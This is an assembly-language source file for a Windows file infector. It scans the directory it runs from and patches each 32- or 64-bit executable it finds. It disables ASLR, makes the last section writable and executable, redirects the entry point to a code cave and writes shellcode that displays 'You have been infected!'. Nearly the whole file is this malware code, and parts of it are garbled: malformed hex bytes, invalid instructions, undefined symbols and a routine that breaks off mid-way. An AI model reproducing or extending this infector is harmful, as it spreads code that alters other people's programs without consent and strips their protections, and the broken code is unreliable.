; --------------------------------------------------------------------------
; MASM32 Version of the PE Injector
;
; This assembly program will:
; 1. Enumerate all files in the same directory as the injector executable.
; 2. For each file, check if it is a 32-bit or 64-bit PE by reading headers.
; 3. Disable ASLR (clear IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE).
; 4. Check if our shellcode signature is already present (to avoid double injection).
; 5. Locate a code cave (a sequence of 0x00 bytes) in the last section.
; 6. Patch the EntryPoint RVA to point into that code cave.
; 7. Copy our shellcode (MessageBox) into the cave and return to the original EntryPoint.
;
; Assembler: MASM32 (ml.exe)
; Libraries: kernel32.lib, user32.lib
;
; To assemble and link:
;     ml /c /coff injector.asm
;     link /subsystem:console /defaultlib:kernel32.lib /defaultlib:user32.lib injector.obj
;
; --------------------------------------------------------------------------

.386
.model flat, stdcall
option casemap:none

; --------------------------------------------------------------------------
; INCLUDE FILES
; --------------------------------------------------------------------------
include windows.inc
include kernel32.inc
include user32.inc
include masm32.inc
includelib kernel32.lib
includelib user32.lib
includelib masm32.lib

; --------------------------------------------------------------------------
; CONST AND TYPE DEFINITIONS
; --------------------------------------------------------------------------
IMAGE_DOS_HEADER         STRUCT
    e_magic     DW ?
    e_cblp      DW ?
    e_cp        DW ?
    e_crlc      DW ?
    e_cparhdr   DW ?
    e_minalloc  DW ?
    e_maxalloc  DW ?
    e_ss        DW ?
    e_sp        DW ?
    e_csum      DW ?
    e_ip        DW ?
    e_cs        DW ?
    e_lfarlc    DW ?
    e_ovno      DW ?
    e_res       DW 4 DUP (?)
    e_oemid     DW ?
    e_oeminfo   DW ?
    e_res2      DW 10 DUP (?)
    e_lfanew    DD ?
IMAGE_DOS_HEADER ENDS

IMAGE_FILE_HEADER        STRUCT
    Machine                 DW ?
    NumberOfSections        DW ?
    TimeDateStamp           DD ?
    PointerToSymbolTable    DD ?
    NumberOfSymbols         DD ?
    SizeOfOptionalHeader    DW ?
    Characteristics         DW ?
IMAGE_FILE_HEADER ENDS

IMAGE_DATA_DIRECTORY     STRUCT
    VirtualAddress  DD ?
    Size            DD ?
IMAGE_DATA_DIRECTORY ENDS

IMAGE_OPTIONAL_HEADER32  STRUCT
    Magic                       DW ?
    MajorLinkerVersion          BYTE ?
    MinorLinkerVersion          BYTE ?
    SizeOfCode                  DD ?
    SizeOfInitializedData       DD ?
    SizeOfUninitializedData     DD ?
    AddressOfEntryPoint         DD ?
    BaseOfCode                  DD ?
    BaseOfData                  DD ?
    ImageBase                   DD ?
    SectionAlignment            DD ?
    FileAlignment               DD ?
    MajorOperatingSystemVersion DW ?
    MinorOperatingSystemVersion DW ?
    MajorImageVersion           DW ?
    MinorImageVersion           DW ?
    MajorSubsystemVersion       DW ?
    MinorSubsystemVersion       DW ?
    Win32VersionValue           DD ?
    SizeOfImage                 DD ?
    SizeOfHeaders               DD ?
    CheckSum                    DD ?
    Subsystem                   DW ?
    DllCharacteristics          DW ?
    SizeOfStackReserve          DD ?
    SizeOfStackCommit           DD ?
    SizeOfHeapReserve           DD ?
    SizeOfHeapCommit            DD ?
    LoaderFlags                 DD ?
    NumberOfRvaAndSizes         DD ?
    DataDirectory               IMAGE_DATA_DIRECTORY 16 DUP <>
IMAGE_OPTIONAL_HEADER32 ENDS

IMAGE_OPTIONAL_HEADER64  STRUCT
    Magic                       DW ?
    MajorLinkerVersion          BYTE ?
    MinorLinkerVersion          BYTE ?
    SizeOfCode                  DD ?
    SizeOfInitializedData       DD ?
    SizeOfUninitializedData     DD ?
    AddressOfEntryPoint         DD ?
    BaseOfCode                  DD ?
    ImageBase                   DQ ?
    SectionAlignment            DD ?
    FileAlignment               DD ?
    MajorOperatingSystemVersion DW ?
    MinorOperatingSystemVersion DW ?
    MajorImageVersion           DW ?
    MinorImageVersion           DW ?
    MajorSubsystemVersion       DW ?
    MinorSubsystemVersion       DW ?
    Win32VersionValue           DD ?
    SizeOfImage                 DD ?
    SizeOfHeaders               DD ?
    CheckSum                    DD ?
    Subsystem                   DW ?
    DllCharacteristics          DW ?
    SizeOfStackReserve          DQ ?
    SizeOfStackCommit           DQ ?
    SizeOfHeapReserve           DQ ?
    SizeOfHeapCommit            DQ ?
    LoaderFlags                 DD ?
    NumberOfRvaAndSizes         DD ?
    DataDirectory               IMAGE_DATA_DIRECTORY 16 DUP <>
IMAGE_OPTIONAL_HEADER64 ENDS

IMAGE_NT_HEADERS32        STRUCT
    Signature       DD ?
    FileHeader      IMAGE_FILE_HEADER <>
    OptionalHeader  IMAGE_OPTIONAL_HEADER32 <>
IMAGE_NT_HEADERS32 ENDS

IMAGE_NT_HEADERS64        STRUCT
    Signature       DD ?
    FileHeader      IMAGE_FILE_HEADER <>
    OptionalHeader  IMAGE_OPTIONAL_HEADER64 <>
IMAGE_NT_HEADERS64 ENDS

IMAGE_SECTION_HEADER      STRUCT
    Name                 BYTE 8 DUP (?)
    Misc                 UNION
        PhysicalAddress   DD ?
        VirtualSize       DD ?
    ENDS
    VirtualAddress       DD ?
    SizeOfRawData        DD ?
    PointerToRawData     DD ?
    PointerToRelocations DD ?
    PointerToLinenumbers DD ?
    NumberOfRelocations  DW ?
    NumberOfLinenumbers  DW ?
    Characteristics      DD ?
IMAGE_SECTION_HEADER ENDS

; --------------------------------------------------------------------------
; SHELLCODE SIGNATURES (to detect if already injected)
; --------------------------------------------------------------------------
.data?
sig32Signature BYTE 8 dup(?)
sig64Signature BYTE 8 dup(?)

.data
; First 8 bytes of our 32-bit shellcode (4 NOPs + PUSHAD + first two bytes of shell)
sig32Bytes BYTE 90h, 90h, 90h, 90h, 60h, 0D9h,0EBh,09h

; First 8 bytes of our 64-bit shellcode (4 NOPs + first MOV RAX sequence)
sig64Bytes BYTE 90h,90h,90h,90h,48h,31h,0C9h,48h

; 32-bit shellcode: MessageBoxA("You have been infected!", "Alert")
BaseShell32 BYTE  \
    0D9h,0EBh,09h,0D9h,074h,024h,0F4h,031h,0D2h,0B2h,077h,031h,0C9h,064h, \
    08Bh,071h,030h,08Bh,076h,00Ch,08Bh,076h,01Ch,08Bh,046h,008h,08Bh,07Eh, \
    020h,08Bh,036h,038h,04Fh,018h,075h,0F3h,059h,001h,0D1h,0FFh,0E1h,060h, \
    08Bh,06Ch,024h,024h,08Bh,045h,03Ch,08Bh,054h,028h,078h,001h,0EAh,08Bh, \
    04Ah,018h,08Bh,05Ah,020h,001h,0EBh,0E3h,034h,049h,08Bh,034h,08Bh,001h, \
    0EEh,031h,0FFh,031h,0C0h,0FCh,0ACh,084h,0C0h,074h,007h,0C1h,0CFh,00Dh, \
    001h,0C7h,0EBh,0F4h,03Bh,07Ch,024h,028h,075h,0E1h,08Bh,05Ah,024h,001h, \
    0EBh,066h,08Bh,00Ch,04Bh,08Bh,05Ah,01Ch,001h,0EBh,08Bh,004h,08Bh,001h, \
    0E8h,089h,044h,024h,01Ch,061h,0C3h,0B2h,008h,029h,0D4h,089h,0E5h,089h, \
    0C2h,068h,08Eh,04Eh,00Eh,0ECh,052h,0E8h,09Fh,0FFh,0FFh,0FFh,089h,045h, \
    004h,0BBh,07Eh,0D8h,0E2h,073h,087h,01Ch,024h,052h,0E8h,08Eh,0FFh,0FFh, \
    0FFh,089h,045h,008h,068h,06Ch,06Ch,020h,041h,068h,033h,033h,02Eh,064h, \
    068h,075h,073h,065h,072h,030h,0DBh,088h,05Ch,024h,00Ah,089h,0E6h,056h, \
    0FFh,055h,004h,089h,0C2h,050h,0BBh,0A8h,0A2h,04Dh,0BCh,087h,01Ch,024h, \
    052h,0E8h,05Fh,0FFh,0FFh,0FFh,068h,074h,058h,020h,020h,068h,041h,06Ch, \
    065h,072h,031h,0DBh,088h,05Ch,024h,005h,089h,0E3h,068h,065h,064h,021h, \
    058h,068h,066h,065h,063h,074h,068h,06Eh,020h,069h,06Eh,068h,020h,062h, \
    065h,065h,068h,068h,061h,076h,065h,068h,059h,06F,075h,020h,031h,0C9h, \
    088h,04Ch,024h,017h,089h,0E1h,031h,0D2h,06Ah,010h,053h,051h,052h,0FFh, \
    0D0h

; 64-bit shellcode: Unicode MessageBoxW(L"You have been infected!", L"Alert")
BaseShell64 BYTE \
    048h,031h,0C9h,048h,081h,0E9h,0D7h,0FFh,0FFh,0FFh,048h,08Dh,005h,0EFh,0FFh,0FFh, \
    0FFh,048h,0BBh,0C8h,099h,0A0h,046h,0CEh,058h,096h,072h,048h,031h,058h,027h,048h, \
    02Dh,0F8h,0FFh,0FFh,0FFh,0E2h,0F4h,034h,0D1h,021h,0A2h,03Eh,0A7h,069h,08Dh,020h, \
    049h,0A0h,046h,0CEh,019h,0C7h,033h,098h,0CBh,0F1h,010h,086h,069h,044h,017h,080h, \
    012h,0F2h,026h,0F0h,010h,01Dh,020h,0D0h,0A7h,0E8h,0C D h,09Ch,078h,0A8h,03Ah,043h, \
    0EBh,0F0h,078h,086h,057h,021h,038h,082h,0D4h,091h,08Fh,086h,069h,056h,0DEh,0F4h, \
    0F8h,0DCh,044h,0E2h,078h,0D7h,0B3h,001h,094h,0E1h,047h,00Fh,0BAh,07Bh,020h,089h, \
    0C8h,09Eh,00Eh,045h,00Ah,0B6h,04Ch,043h,0DBh,09Ch,00Eh,0CFh,088h,0A8h,0F9h,048h, \
    011h,0A0h,046h,0CEh,010h,013h,0B2h,0BCh,0F6h,0E8h,047h,01Eh,008h,0A8h,0F9h,080h, \
    081h,09Eh,002h,045h,018h,0B6h,03Bh,0C9h,049h,043h,01Ah,086h,0A7h,05Fh,04Ch,089h, \
    012h,094h,0CEh,086h,059h,040h,03Fh,0F9h,050h,0E8h,077h,00Eh,0F4h,0D7h,0B3h,001h, \
    094h,0E1h,047h,00Fh,060h,076h,007h,039h,0A7h,0ECh,045h,082h,07Ch,09Eh,037h,0F1h, \
    048h,0D5h,090h,096h,066h,0D2h,0F9h,088h,0BDh,0E9h,047h,01Eh,03Eh,0A8h,033h,043h, \
    095h,0E8h,078h,08Ah,0D3h,0D6h,06Eh,081h,098h,070h,078h,08Fh,0D3h,092h,0FAh,080h, \
    098h,070h,007h,096h,019h,0CEh,02Ch,091h,0C3h,0E1h,01Eh,08Fh,001h,0D7h,028h,080h, \
    01Ah,04Ch,066h,08Fh,00Ah,069h,092h,090h,0D8h,0F9h,01Ch,0F0h,010h,01Dh,060h,021h, \
    0D0h,05Fh,0B9h,031h,005h,0A8h,03Ah,045h,014h,08Ch,047h,0CEh,058h,0D7h,0C8h,084h, \
    0EEh,086h,041h,031h,08Dh,0DFh,0B5h,009h,089h,0A0h,046h,0CEh,066h,0DEh,0FFh,05Dh, \
    097h,0A1h,046h,0CEh,066h,0DAh,0FFh,04Dh,0BFh,0A1h,046h,0CEh,010h,0A7h,0BBh,089h, \
    023h,0E5h,0C5h,098h,05Fh,069h,0A7h,080h,0A8h,069h,007h,074h,0A8h,023h,0D0h,09Eh, \
    066h,075h,01Fh,0A1h,02Dh,0B6h,01Ah,0A9h,0EFh,0C5h,066h,0ACh,03Dh,0F3h,01Ch,0E8h, \
    0F0h,0CEh,020h,0ABh,03Bh,0E2h,017h,0ACh,0B8h,0A0h,007h,0A2h,03Dh,0E4h,006h,0C8h, \
    0ECh,0D3h,023h,0BCh,06Bh,0A4h,05Ch,0ACh,0F5h

; --------------------------------------------------------------------------
; Forward reference
; --------------------------------------------------------------------------
injectFile PROTO :PTR

; --------------------------------------------------------------------------
; MAIN
; --------------------------------------------------------------------------
.code
start:
    LOCAL exeFullPath      [MAX_PATH] BYTE
    LOCAL dirPath          [MAX_PATH] BYTE
    LOCAL searchPattern    [MAX_PATH] BYTE
    LOCAL candidatePath    [MAX_PATH] BYTE
    LOCAL findData         WIN32_FIND_DATAA <>
    LOCAL hFind            HANDLE
    LOCAL lastSlash        PTR BYTE

    ; 1. Get full path of this injector
    INVOKE GetModuleFileNameA, NULL, ADDR exeFullPath, MAX_PATH

    ; 2. Extract directory (truncate at last '\')
    mov     eax, OFFSET exeFullPath
    mov     lastSlash, eax
find_backslash_loop:
    cmp     byte ptr [lastSlash], 0
    je      use_found_slash
    inc     lastSlash
    jmp     find_backslash_loop
use_found_slash:
    ; now lastSlash points at terminating NULL; scan backward
    dec     lastSlash
backwards_search:
    cmp     lastSlash, OFFSET exeFullPath
    jb      abort_nomatch
    cmp     byte ptr [lastSlash], '\'
    je      have_slash
    dec     lastSlash
    jmp     backwards_search
abort_nomatch:
    ; if no slash found, just set dirPath = "."
    mov     eax, OFFSET dirPath
    mov     byte ptr [eax], '.'
    mov     byte ptr [eax+1], 0
    jmp     build_search
have_slash:
    ; copy up to (and including) slash into dirPath, then terminate
    lea     esi, exeFullPath
    lea     edi, dirPath
copy_loop:
    mov     al, [esi]
    mov     [edi], al
    cmp     al, '\' 
    je      term_dir
    inc     esi
    inc     edi
    jmp     copy_loop
term_dir:
    inc     edi            ; include the '\'
    mov     byte ptr [edi], 0

build_search:
    ; 3. Build search pattern "<dirPath>*.*"
    lea     esi, dirPath
    lea     edi, searchPattern
    mov     ecx, MAX_PATH
copy_dir2search:
    mov     al, [esi]
    mov     [edi], al
    inc     esi
    inc     edi
    cmp     al, 0
    jne     copy_dir2search
    ; now append "*.*"
    mov     byte ptr [edi], '*'
    mov     byte ptr [edi+1], '.'
    mov     byte ptr [edi+2], '*'
    mov     byte ptr [edi+3], 0

    ; 4. Enumerate files in that directory
    INVOKE FindFirstFileA, ADDR searchPattern, ADDR findData
    cmp     eax, INVALID_HANDLE_VALUE
    je      no_files
    mov     hFind, eax

enum_loop:
    ; Skip "." and ".."
    lea     esi, findData.cFileName
    INVOKE lstrcmpA, esi, ADDR szDot
    cmp     eax, 0
    je      next_file
    INVOKE lstrcmpA, esi, ADDR szDotDot
    cmp     eax, 0
    je      next_file

    ; Skip directories
    mov     eax, findData.dwFileAttributes
    test    eax, FILE_ATTRIBUTE_DIRECTORY
    jnz     next_file

    ; Build full path: "<dirPath>\<filename>"
    lea     esi, dirPath
    lea     edi, candidatePath
    mov     ecx, MAX_PATH
copy_dir2candidate:
    mov     al, [esi]
    mov     [edi], al
    inc     esi
    inc     edi
    cmp     al, 0
    jne     copy_dir2candidate
    ; Insert filename
    lea     esi, findData.cFileName
copy_file2candidate:
    mov     al, [esi]
    mov     [edi], al
    inc     esi
    inc     edi
    cmp     al, 0
    jne     copy_file2candidate

    ; Skip if candidatePath == exeFullPath (our injector)
    lea     esi, candidatePath
    lea     edi, exeFullPath
    INVOKE lstrcmpiA, esi, edi
    cmp     eax, 0
    je      next_file

    ; Quick “MZ” check
    INVOKE CreateFileA, esi, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    cmp     eax, INVALID_HANDLE_VALUE
    je      next_file
    mov     ecx, eax       ; save handle
    LOCAL mzBytes[2] BYTE
    INVOKE ReadFile, ecx, ADDR mzBytes, 2, ADDR DWORD ptr mzBytes+2, NULL
    INVOKE CloseHandle, ecx
    cmp     mzBytes[0], 'M'
    jne     next_file
    cmp     mzBytes[1], 'Z'
    jne     next_file

    ; Attempt injection
    push    esi             ; address of candidatePath
    call    injectFile

next_file:
    INVOKE FindNextFileA, hFind, ADDR findData
    test    eax, eax
    jne     enum_loop

    INVOKE FindClose, hFind

no_files:
    ; Exit process
    INVOKE ExitProcess, 0

; --------------------------------------------------------------------------
; injectFile:
;
; Implements:
;  1. Open file, read into buffer.
;  2. Parse DOS header, NT header.
;  3. Disable ASLR (clear IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE).
;  4. Check for existing shellcode signature.
;  5. Locate last section, find code cave.
;  6. Patch EntryPoint, copy shellcode, write file back.
;
; Arguments:
;   [esp+4] → pointer to ASCII filename (zero-terminated).
; Returns:
;   EAX = 0 → success
;         1 → error
;         2 → skip (not PE or already injected)
; --------------------------------------------------------------------------
injectFile PROC uses esi edi ebx ecx edx ebp, lpFilename:PTR_BYTE
    LOCAL hFile           :HANDLE
    LOCAL fileSize        :DWORD
    LOCAL bytesRead       :DWORD
    LOCAL buffer          :PTR BYTE
    LOCAL dosHdr          :PTR IMAGE_DOS_HEADER
    LOCAL ntHdrSig        :DWORD
    LOCAL pFileHeader     :PTR IMAGE_FILE_HEADER
    LOCAL pOptHeader32    :PTR IMAGE_OPTIONAL_HEADER32
    LOCAL pOptHeader64    :PTR IMAGE_OPTIONAL_HEADER64
    LOCAL is32PE          :DWORD
    LOCAL is64PE          :DWORD
    LOCAL e_lfanew        :DWORD
    LOCAL pSection        :PTR IMAGE_SECTION_HEADER
    LOCAL numSections     :DWORD
    LOCAL lastSec         :PTR IMAGE_SECTION_HEADER
    LOCAL lastRawPtr      :DWORD
    LOCAL lastRawSize     :DWORD
    LOCAL lastVirtAddr    :DWORD
    LOCAL lastVirtSize    :DWORD
    LOCAL origEntryRVA32  :DWORD
    LOCAL imageBase       :QWORD
    LOCAL minCaveSize     :DWORD
    LOCAL rawOffsetFound  :QWORD
    LOCAL virtAddrFound   :QWORD
    LOCAL countZeros      :DWORD
    LOCAL baseSize        :DWORD
    LOCAL newEntryRVA     :DWORD
    LOCAL origEntryVA     :QWORD
    LOCAL shellBuffer     :PTR BYTE
    LOCAL blobSize        :DWORD
    LOCAL shellSig        BYTE 8 DUP (?)

    ; ----------------------------------------------------------------------
    ; 1. Open file for read/write
    ; ----------------------------------------------------------------------
    INVOKE CreateFileA, lpFilename, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    cmp     eax, INVALID_HANDLE_VALUE
    je      inj_skip      ; cannot open

    mov     hFile, eax

    ; ----------------------------------------------------------------------
    ; 2. Get file size
    ; ----------------------------------------------------------------------
    INVOKE GetFileSize, hFile, NULL
    mov     fileSize, eax
    test    eax, eax
    jz      inj_skip      ; empty file

    ; ----------------------------------------------------------------------
    ; 3. Allocate buffer and read entire file
    ; ----------------------------------------------------------------------
    INVOKE GlobalAlloc, GPTR, fileSize
    mov     buffer, eax
    cmp     buffer, NULL
    je      inj_error

    INVOKE ReadFile, hFile, buffer, fileSize, ADDR bytesRead, NULL
    cmp     bytesRead, fileSize
    jne     inj_free_buf

    ; ----------------------------------------------------------------------
    ; 4. Parse DOS header
    ; ----------------------------------------------------------------------
    mov     dosHdr, buffer
    mov     ax, [dosHdr].IMAGE_DOS_HEADER.e_magic
    cmp     ax, IMAGE_DOS_SIGNATURE
    jne     inj_free_buf  ; not a PE

    mov     e_lfanew, [dosHdr].IMAGE_DOS_HEADER.e_lfanew

    ; Check e_lfanew within file
    mov     eax, e_lfanew
    add     eax, TYPE IMAGE_NT_HEADERS32(Signature)    ; just check signature size
    cmp     eax, fileSize
    ja      inj_free_buf

    ; ----------------------------------------------------------------------
    ; 5. Parse NT Signature
    ; ----------------------------------------------------------------------
    mov     eax, buffer
    add     eax, e_lfanew
    mov     ntHdrSig, [eax]
    cmp     ntHdrSig, IMAGE_NT_SIGNATURE
    jne     inj_free_buf

    ; ----------------------------------------------------------------------
    ; 6. Locate FileHeader + OptionalHeader
    ; ----------------------------------------------------------------------
    mov     pFileHeader, eax
    add     pFileHeader, 4    ; skip Signature
    mov     pOptHeader32, pFileHeader
    add     pOptHeader32, sizeof IMAGE_FILE_HEADER

    mov     pOptHeader64, pOptHeader32    ; same address; we'll interpret by Magic

    ; ----------------------------------------------------------------------
    ; 7. Determine 32-bit vs 64-bit
    ; ----------------------------------------------------------------------
    mov     ax, [pOptHeader32].IMAGE_OPTIONAL_HEADER32.Magic
    cmp     ax, IMAGE_NT_OPTIONAL_HDR32_MAGIC
    je      is_32_bit
    cmp     ax, IMAGE_NT_OPTIONAL_HDR64_MAGIC
    je      is_64_bit
    jmp     inj_free_buf      ; unsupported PE

is_32_bit:
    mov     is32PE, 1
    mov     is64PE, 0
    jmp     store_headers

is_64_bit:
    mov     is32PE, 0
    mov     is64PE, 1

store_headers:
    ; Save NumberOfSections
    mov     eax, [pFileHeader].IMAGE_FILE_HEADER.NumberOfSections
    mov     numSections, eax

    ; For 32-bit, get orig EntryPoint RVA and ImageBase
    cmp     is32PE, 1
    jne     get64_headers

    ; IMAGE_NT_HEADERS32 pointer = buffer + e_lfanew
    mov     ebx, buffer
    add     ebx, e_lfanew
    mov     origEntryRVA32, [ebx].IMAGE_NT_HEADERS32.OptionalHeader.AddressOfEntryPoint
    mov     eax, [ebx].IMAGE_NT_HEADERS32.OptionalHeader.ImageBase
    mov     dword ptr imageBase, eax
    mov     dword ptr imageBase+4, 0

    ; Clear ASLR flag
    mov     ax, [ebx].IMAGE_NT_HEADERS32.OptionalHeader.DllCharacteristics
    and     ax, not IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
    mov     [ebx].IMAGE_NT_HEADERS32.OptionalHeader.DllCharacteristics, ax

    jmp     after_headers

get64_headers:
    ; IMAGE_NT_HEADERS64 pointer = buffer + e_lfanew
    mov     ebx, buffer
    add     ebx, e_lfanew
    mov     origEntryRVA32, [ebx].IMAGE_NT_HEADERS64.OptionalHeader.AddressOfEntryPoint
    mov     eax, [ebx].IMAGE_NT_HEADERS64.OptionalHeader.ImageBase      ; low dword
    mov     edx, [ebx].IMAGE_NT_HEADERS64.OptionalHeader.ImageBase+4    ; high dword
    mov     dword ptr imageBase, eax
    mov     dword ptr imageBase+4, edx

    ; Clear ASLR flag
    mov     ax, [ebx].IMAGE_NT_HEADERS64.OptionalHeader.DllCharacteristics
    and     ax, not IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
    mov     [ebx].IMAGE_NT_HEADERS64.OptionalHeader.DllCharacteristics, ax

after_headers:
    ; ----------------------------------------------------------------------
    ; 8. Check for existing shellcode signature
    ;    If 32-bit: look for sig32Bytes in buffer
    ;    If 64-bit: look for sig64Bytes in buffer
    ; ----------------------------------------------------------------------
    cmp     is32PE, 1
    je      check_sig32
    cmp     is64PE, 1
    jne     inj_free_buf

    ; Check 64-bit signature
    lea     esi, BaseShell64     ; use first 8 bytes as sig
    mov     edi, OFFSET sig64Signature
    mov     ecx, 8
    rep movsb
    mov     esi, buffer
    mov     ecx, fileSize
    lea     edi, sig64Signature
    push    ecx
    push    eax
    push    edx
sig64_search:
    cmp     ecx, 8
    jl      sig_not_found
    mov     ebx, esi
    mov     edx, 8
    repe cmpsb
    je      sig_found
    lea     esi, [esi+1]
    dec     ecx
    jmp     sig64_search
sig_not_found:
    pop     edx
    pop     eax
    jmp     proceed_cave
sig_found:
    pop     edx
    pop     eax
    pop     ecx
    free_and_skip

check_sig32:
    ; Check 32-bit signature
    lea     esi, BaseShell32     ; first 8 bytes
    mov     edi, OFFSET sig32Signature
    mov     ecx, 8
    rep movsb
    mov     esi, buffer
    mov     ecx, fileSize
    lea     edi, sig32Signature
    push    ecx
    push    eax
    push    edx
sig32_search:
    cmp     ecx, 8
    jl      sig_not_found32
    mov     ebx, esi
    mov     edx, 8
    repe cmpsb
    je      sig_found32
    lea     esi, [esi+1]
    dec     ecx
    jmp     sig32_search
sig_not_found32:
    pop     edx
    pop     eax
    jmp     proceed_cave
sig_found32:
    pop     edx
    pop     eax
    pop     ecx
    free_and_skip

; ----------------------------------------------------------------------
; 9. Locate the last section header
; ----------------------------------------------------------------------
proceed_cave:
    ; pSection = address of first section
    lea     esi, pOptHeader32
    ; Skip OptionalHeader32/64
    cmp     is32PE, 1
    je      section_ptr32
    ; 64-bit optional header is larger
    add     esi, sizeof IMAGE_OPTIONAL_HEADER64
    jmp     section_after
section_ptr32:
    add     esi, sizeof IMAGE_OPTIONAL_HEADER32
section_after:
    ; Now esi = &first IMAGE_SECTION_HEADER
    mov     pSection, esi
    mov     eax, numSections
    dec     eax
    imul    eax, TYPE IMAGE_SECTION_HEADER
    lea     ebx, [pSection+eax]
    mov     lastSec, ebx

    ; Save last section properties
    mov     lastRawPtr, [lastSec].IMAGE_SECTION_HEADER.PointerToRawData
    mov     lastRawSize, [lastSec].IMAGE_SECTION_HEADER.SizeOfRawData
    mov     lastVirtAddr, [lastSec].IMAGE_SECTION_HEADER.VirtualAddress
    mov     lastVirtSize, [lastSec].IMAGE_SECTION_HEADER.Misc.VirtualSize

    ; Expand last section flags: CODE|EXECUTE|READ|WRITE
    mov     eax, IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
    mov     [lastSec].IMAGE_SECTION_HEADER.Characteristics, eax

    ; ----------------------------------------------------------------------
    ; 10. Find code cave in last section
    ; ----------------------------------------------------------------------
    mov     baseSize, is32PE ? BASE_SHELL32_SIZE : BASE_SHELL64_SIZE
    mov     eax, PREFIX_NOP_COUNT
    add     eax, 1          ; PUSHAD or nothing
    add     eax, baseSize
    add     eax, 1          ; POPAD or nothing
    add     eax, is32PE ? 5 : 12
    mov     minCaveSize, eax

    xor     ecx, ecx
    mov     esi, lastRawPtr
    mov     edi, 0          ; rawOffsetFound
    mov     ebx, 0          ; virtAddrFound
    mov     countZeros, 0

find_zero_run:
    cmp     ecx, lastRawSize
    jge     cave_not_found
    mov     al, [buffer+esi+ecx]
    cmp     al, 0
    jne     zero_reset
    inc     countZeros
    cmp     countZeros, minCaveSize
    jl      inc_zero_idx
    ; found sufficiently long run
    mov     edi, esi
    add     edi, ecx
    sub     edi, countZeros
    mov     dword ptr rawOffsetFound, edi
    ; virtAddrFound = imageBase + lastVirtAddr + (off - countZeros)
    mov     eax, esi
    add     eax, ecx
    sub     eax, countZeros
    add     eax, lastVirtAddr
    push    dword ptr imageBase+4
    push    dword ptr imageBase
    pop     edx           ; edx:eax = imageBase
    pop     ecx
    add     eax, ecx      ; low-dword
    adc     edx, 0        ; propagate high
    mov     dword ptr virtAddrFound, eax
    mov     dword ptr virtAddrFound+4, edx
    jmp     cave_found
inc_zero_idx:
    inc     ecx
    jmp     find_zero_run
zero_reset:
    xor     countZeros, countZeros
    inc     ecx
    jmp     find_zero_run

cave_not_found:
    ; no cave found
    free_and_error

cave_found:
    ; ------------------------------------------------------------------
    ; 11. Patch EntryPoint to newEntryVA = virtAddrFound
    ; ------------------------------------------------------------------
    mov     eax, virtAddrFound        ; low 32 bits
    mov     newEntryRVA, eax
    shr     virtAddrFound, 32
    mov     edx, virtAddrFound        ; high 32 bits of newEntryVA
    ; Recompute newEntryRVA = (newEntryVA - imageBase) & 0xFFFFFFFF
    mov     eax, newEntryRVA
    sub     eax, dword ptr imageBase
    mov     newEntryRVA, eax

    cmp     is32PE, 1
    je      patch32_ep
    ; patch 64-bit EP
    mov     esi, buffer
    add     esi, e_lfanew
    mov     [esi].IMAGE_NT_HEADERS64.OptionalHeader.AddressOfEntryPoint, newEntryRVA
    jmp     ep_patched
patch32_ep:
    ; patch 32-bit EP
    mov     esi, buffer
    add     esi, e_lfanew
    mov     [esi].IMAGE_NT_HEADERS32.OptionalHeader.AddressOfEntryPoint, newEntryRVA

ep_patched:
    ; ------------------------------------------------------------------
    ; 12. Compute origEntryVA = imageBase + origEntryRVA32
    ; ------------------------------------------------------------------
    mov     eax, origEntryRVA32
    add     eax, dword ptr imageBase
    mov     dword ptr origEntryVA, eax
    mov     eax, dword ptr imageBase+4
    adc     eax, 0
    mov     dword ptr origEntryVA+4, eax

    ; ------------------------------------------------------------------
    ; 13. Build final shellcode blob
    ; ------------------------------------------------------------------
    cmp     is32PE, 1
    je      build32_blob
    ; 64-bit blob
    ; blobSize = 4 + BASE_SHELL64_SIZE + 10 + 2
    mov     eax, PREFIX_NOP_COUNT
    add     eax, BASE_SHELL64_SIZE
    add     eax, 10
    add     eax, 2
    mov     blobSize, eax
    ; allocate blob
    INVOKE GlobalAlloc, GPTR, blobSize
    mov     shellBuffer, eax

    ; Fill blob
    xor     ecx, ecx
fill_nops64:
    cmp     ecx, PREFIX_NOP_COUNT
    jge     copy_base64
    mov     byte ptr [shellBuffer+ecx], 90h
    inc     ecx
    jmp     fill_nops64

copy_base64:
    ; Copy BaseShell64
    mov     edi, shellBuffer
    add     edi, PREFIX_NOP_COUNT
    lea     esi, BaseShell64
    mov     ecx, BASE_SHELL64_SIZE
    rep movsb

    ; MOV RAX, origEntryVA (10 bytes)
    mov     edi, shellBuffer
    add     edi, PREFIX_NOP_COUNT
    add     edi, BASE_SHELL64_SIZE
    mov     byte ptr [edi], 048h
    mov     byte ptr [edi+1], 0B8h
    lea     esi, origEntryVA
    mov     ecx, 8
    rep movsb

    ; JMP RAX (2 bytes)
    mov     byte ptr [edi+8], 0FFh
    mov     byte ptr [edi+9], 0E0h

    jmp     blob_ready

build32_blob:
    ; 32-bit blob: 4 + 1 + BASE_SHELL32_SIZE + 1 + 5
    mov     eax, PREFIX_NOP_COUNT
    add     eax, 1
    add     eax, BASE_SHELL32_SIZE
    add     eax, 1
    add     eax, 5
    mov     blobSize, eax
    INVOKE GlobalAlloc, GPTR, blobSize
    mov     shellBuffer, eax

    xor     ecx, ecx
fill_nops32:
    cmp     ecx, PREFIX_NOP_COUNT
    jge     pushad32
    mov     byte ptr [shellBuffer+ecx], 90h
    inc     ecx
    jmp     fill_nops32

pushad32:
    mov     byte ptr [shellBuffer+ecx], 60h
    inc     ecx

    ; Copy BaseShell32
    lea     edi, [shellBuffer+ecx]
    lea     esi, BaseShell32
    mov     ecx, BASE_SHELL32_SIZE
    rep movsb
    add     ecx, 0       ; now ecx = old ECX + BASE_SHELL32_SIZE
    ; fix ecx to new offset
    sub     esi, BASE_SHELL32_SIZE
    sub     edi, BASE_SHELL32_SIZE
    mov     ecx, PREFIX_NOP_COUNT
    add     ecx, 1
    add     ecx, BASE_SHELL32_SIZE

    ; POPAD
    mov     byte ptr [shellBuffer+ecx], 61h
    inc     ecx

    ; JMP rel32 → origEntry
    ; jmpInstrVA = newEntryVA + ecx
    ; rel32 = origEntryVA - (jmpInstrVA + 5)
